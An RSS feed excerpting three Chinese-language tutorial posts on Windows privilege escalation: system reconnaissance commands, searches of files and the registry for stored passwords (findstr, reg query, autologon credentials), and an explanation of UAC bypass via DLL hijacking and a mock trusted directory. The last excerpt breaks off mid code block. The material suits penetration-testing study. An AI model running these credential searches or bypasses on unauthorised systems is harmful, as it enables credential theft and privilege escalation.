<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>windows提权 on mrlxl的知识库</title>
    <link>https://luoshine99-gif.github.io/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows%E6%8F%90%E6%9D%83/</link>
    <description>Recent content in windows提权 on mrlxl的知识库</description>
    <generator>Hugo</generator>
    <language>en-US</language>
    <lastBuildDate>Thu, 11 Dec 2025 00:00:00 +0800</lastBuildDate>
    <atom:link href="https://luoshine99-gif.github.io/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows%E6%8F%90%E6%9D%83/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>windows下的信息收集</title>
      <link>https://luoshine99-gif.github.io/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows%E6%8F%90%E6%9D%83/windows%E4%B8%8B%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</link>
      <pubDate>Thu, 11 Dec 2025 00:00:00 +0800</pubDate>
      <guid>https://luoshine99-gif.github.io/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows%E6%8F%90%E6%9D%83/windows%E4%B8%8B%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</guid>
      <description>&lt;h1 id=&#34;权限提升-windows下的信息收集&#34;&gt;权限提升-windows下的信息收集&lt;/h1&gt;&#xA;&lt;p&gt;进入内网后，可以通过信息收集扩展攻击面，找到更多可能导致权限提升的入口点&lt;/p&gt;&#xA;&lt;h3 id=&#34;服务器信息枚举&#34;&gt;服务器信息枚举&lt;/h3&gt;&#xA;&lt;h5 id=&#34;版本信息&#34;&gt;版本信息&lt;/h5&gt;&#xA;&lt;p&gt;查看系统版本号：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;ver&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;架构信息&#34;&gt;架构信息&lt;/h5&gt;&#xA;&lt;p&gt;获取到服务器架构信息，有助于后续选择对应的漏洞利用程序或编写exp和payload&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wmic os get osarchitecture&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;或&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;%PROCESSOR_ARCHITECTURE%&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;服务信息&#34;&gt;服务信息&lt;/h5&gt;&#xA;&lt;p&gt;获取服务信息可以得知系统服务的进程ID、启动方式和状态，效果类似于运行services.msc&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sc query state=all&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;或&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;wmic&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;service&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;list&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;brief&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;powershell命令获取服务及服务对应的执行文件路径和参数：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-wmiObject&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;win32_service&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;select &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PathName&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;进程信息&#34;&gt;进程信息&lt;/h5&gt;&#xA;&lt;p&gt;获取系统进程:&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tasklist&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;获取进程信息:&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tasklist /svc&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用wmic命令获取系统进程信息：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wmic process list brief&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;也可以使用powershell cmdlet命令：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;ps&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;或&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-WmiObject&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Query&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;select * from Win32_Process&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;where &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-notlike&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;svchost*&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Select-Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Handle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Label&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Owner&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Expression&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;={&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;GetOwner&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;User&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}}&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Format-Table&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-AutoSize&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;驱动信息&#34;&gt;驱动信息&lt;/h5&gt;&#xA;&lt;p&gt;获取当前系统中安装的服务器驱动程序信息：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;driverquery&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;服务器驱动程序信息有助于我们发现可能存在漏洞的驱动，进而去搜索漏洞利用程序进行提权&lt;/p&gt;&#xA;&lt;h5 id=&#34;磁盘信息&#34;&gt;磁盘信息&lt;/h5&gt;&#xA;&lt;p&gt;获取计算机的全部磁盘信息：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;wmic&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;logicaldisk&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;get&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;caption&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;description&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;providername&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;获取某个磁盘的文件夹树并将结果输出到文件夹中：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tree D:\ &lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;E:\Desktop\tree.txt&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;获取某个磁盘的文件列表并将结果输出到文本文件中：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;dir&lt;/span&gt; /s D:\ &lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;E:\Desktop\tree.txt&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;补丁信息&#34;&gt;补丁信息&lt;/h5&gt;&#xA;&lt;p&gt;获取系统补丁情况：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wmic qfe get Caption,Description,HotFixID,InstalledOn&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;也可以使用Powershell cmdlet命令：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-wmiObject&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-query&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;select * from win32_quickfixengineering&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hotfixid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;或&lt;/p&gt;</description>
    </item>
    <item>
      <title>windows密码操作</title>
      <link>https://luoshine99-gif.github.io/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows%E6%8F%90%E6%9D%83/windows%E5%AF%86%E7%A0%81%E6%93%8D%E4%BD%9C/</link>
      <pubDate>Thu, 11 Dec 2025 00:00:00 +0800</pubDate>
      <guid>https://luoshine99-gif.github.io/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows%E6%8F%90%E6%9D%83/windows%E5%AF%86%E7%A0%81%E6%93%8D%E4%BD%9C/</guid>
      <description>&lt;h1 id=&#34;权限提升-windows密码操作&#34;&gt;权限提升-windows密码操作&lt;/h1&gt;&#xA;&lt;h2 id=&#34;密码搜索&#34;&gt;密码搜索&lt;/h2&gt;&#xA;&lt;p&gt;密码搜索属于信息搜集的一部分，很多用户喜欢将自己的网站、邮箱、应用程序设置同一个密码，可以执行各类命令来搜索系统内存储密码的配置文件，通过组合收集到的密码来尝试登陆高权限账户，可能达到权限提升或横向移动的目的&lt;/p&gt;&#xA;&lt;h4 id=&#34;文件中的密码搜索&#34;&gt;文件中的密码搜索&lt;/h4&gt;&#xA;&lt;h5 id=&#34;搜索文件内容&#34;&gt;搜索文件内容&lt;/h5&gt;&#xA;&lt;p&gt;搜索文件内容里包括“password”字符串的txt文件：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;findstr /SI /M &lt;span class=&#34;s2&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt; *.txt&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;也可以增加其他文件的格式：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;findstr /SI /M &lt;span class=&#34;s2&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt; *.txt *.ini *.config&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&#xA;&lt;li&gt;参数/SI：在当前目录和所有子目录中搜索指定文件， 指定搜索部分大小写&lt;/li&gt;&#xA;&lt;li&gt;参数/M：如果搜索到相关的文件，则只列出文件的绝对路径&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;再使用&lt;code&gt;“type + 目标文件路径”&lt;/code&gt;命令来获取文件内容&lt;/p&gt;&#xA;&lt;p&gt;如果不添加参数&lt;code&gt;/M&lt;/code&gt;，则会列出包含目标字符串的所有文件和内容，会显得比较杂乱&lt;/p&gt;&#xA;&lt;h5 id=&#34;搜索文件名&#34;&gt;搜索文件名&lt;/h5&gt;&#xA;&lt;p&gt;搜索当前目录及子目录中文件名包含字符串“password”的文件：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;dir&lt;/span&gt; /s *password*&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;powershell命令：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-ChildItem&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;文件夹路径&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Include&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;txt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-recurse&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;cmd命令切换到其他目录并搜索文件名中包含web.config的文件：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;cd&lt;/span&gt; /d E: &lt;span class=&#34;p&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;dir&lt;/span&gt; /b /s web.config&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;用for命令查找某盘符内文件名包含password.txt:&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; /r &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;盘符&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;%i in (password.txt) do @echo %&lt;/span&gt;i&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;也可以使用where命令来查找这种类型的文件：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;where /r C:\ *password.txt&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;在注册表中寻找密码&#34;&gt;在注册表中寻找密码&lt;/h4&gt;&#xA;&lt;p&gt;获取注册表根键HKCU下包含“password”字符串的全部内容：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;reg query HKCU /f password /t REG_SZ /s&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;为了方便查看，或当前在webshell中操作时，可以将结果保存在文本中，下载后再查看&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;reg query HKCU /f password /t REG_SZ /s &lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;temp.txt&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;正常情况下，每次登陆服务器都需要输入密码，但有些管理员为了方便，可能会设置自动登录，注册表中会保存自动登录的账号和密码，所以可以尝试命令获取自动登录密码：&lt;/p&gt;</description>
    </item>
    <item>
      <title>windows提权-Bypass UAC</title>
      <link>https://luoshine99-gif.github.io/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows%E6%8F%90%E6%9D%83/windows%E6%8F%90%E6%9D%83-bypass-uac/</link>
      <pubDate>Thu, 11 Dec 2025 00:00:00 +0800</pubDate>
      <guid>https://luoshine99-gif.github.io/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows%E6%8F%90%E6%9D%83/windows%E6%8F%90%E6%9D%83-bypass-uac/</guid>
      <description>&lt;h1 id=&#34;windows提权-bypass-uac&#34;&gt;windows提权-Bypass UAC&lt;/h1&gt;&#xA;&lt;p&gt;大多数应用程序都是以中级别完整性运行的，包括本地管理员会话，但如果选择“以管理员身份”运行，可以从中级别完整性提升到高级别，但这个过程会有UAC对话框弹出：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20241231143754429.png&#34; alt=&#34;image-20241231143754429&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;用户账户控制（User Accou Control），一种安全机制，开启后，每个需要使用到管理员访问令牌的应用都需要征得管理员同意&lt;/p&gt;&#xA;&lt;p&gt;UAC限制的用户：除Administrator（RID 500）的所有用户（包括非RID 500的管理员）&lt;/p&gt;&#xA;&lt;p&gt;非RID 500管理员用户登录后，系统会为其创建两个单独的访问令牌：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;标准访问令牌&lt;/li&gt;&#xA;&lt;li&gt;管理员访问令牌&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;管理员正常启动不执行管理任务的应用就是使用的标准访问令牌，当要执行高权限管理任务就需要使用管理员访问令牌，就会触发UAC弹窗&lt;/p&gt;&#xA;&lt;p&gt;而Bypass UAC，实际上就是绕过上面所说的安全机制，使非RID 500的管理员账户可以直接调用管理员访问令牌来获取全部管理员权限，这仅仅是绕过了保护机制，不是真正意义上的提权（和linux的rbash逃逸的感觉相似）&lt;/p&gt;&#xA;&lt;h3 id=&#34;uac白名单&#34;&gt;UAC白名单&lt;/h3&gt;&#xA;&lt;p&gt;微软在UAC中为一部分系统程序设置了白名单，白名单中的程序能够用静默的方式自动提升到管理员权限运行，比如rundll32.exe、explorer.exe&lt;/p&gt;&#xA;&lt;p&gt;可以通过微软官方提供的工具Sigcheck和Strings来寻找白名单程序，白名单程序的Mainifest数据中autoElivate属性值为true，检测工具大多也是检测这个属性&lt;/p&gt;&#xA;&lt;p&gt;我们可以通过对这些白名单程序进行DLL劫持、DLL注入、注册表劫持，实现Bypass UAC&lt;/p&gt;&#xA;&lt;h3 id=&#34;dll劫持&#34;&gt;DLL劫持&lt;/h3&gt;&#xA;&lt;p&gt;和我linux提权文章中写的so共享库劫持原理相似&lt;/p&gt;&#xA;&lt;p&gt;程序启动时DLL的加载顺序如下:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;1.程序所在目录&lt;/li&gt;&#xA;&lt;li&gt;2.程序加载目录（SetCurrentDirectory）&lt;/li&gt;&#xA;&lt;li&gt;3.系统目录即 SYSTEM32 目录&lt;/li&gt;&#xA;&lt;li&gt;4.16位系统目录即 SYSTEM 目录&lt;/li&gt;&#xA;&lt;li&gt;5.Windows目录&lt;/li&gt;&#xA;&lt;li&gt;6.PATH环境变量中列出的目录&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;PS：Windows操作系统通过“DLL路径搜索目录顺序”和“Know DLLs注册表项”的机制来确定应用程序所要调用的DLL的路径，之后，应用程序就将DLL载入了自己的内存空间，执行相应的函数功能&lt;/p&gt;&#xA;&lt;p&gt;我只需要将同名恶意dll的位置放在合法dll的搜索目录之前，加载的时候就实现了劫持&lt;/p&gt;&#xA;&lt;h3 id=&#34;模拟可信任目录&#34;&gt;模拟可信任目录&lt;/h3&gt;&#xA;&lt;p&gt;程序请求自动提升权限的条件：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;文件Manitest中autoElevate属性的值为True&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;检查文件的签名&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;文件是否位于系统可信任目录中&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;系统在检查可信任目录时，相关函数会自动去掉可执行文件路径中的空格。如果可执行文件位于“C:\windows \system32”目录（在windows后有一个空格，下文统称“模拟可信任目录”）中，系统在检查时会自动去除路径中的空格，这样就通过了最后一个条件的检查&lt;/p&gt;&#xA;&lt;p&gt;那么根据可信任目录来创建一个包含尾随空格的模拟可信任目录，将一个白名单程序复制到模拟可信任目录中，配合DLL劫持等技术即可成功绕过UAC&lt;/p&gt;&#xA;&lt;p&gt;比如：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; 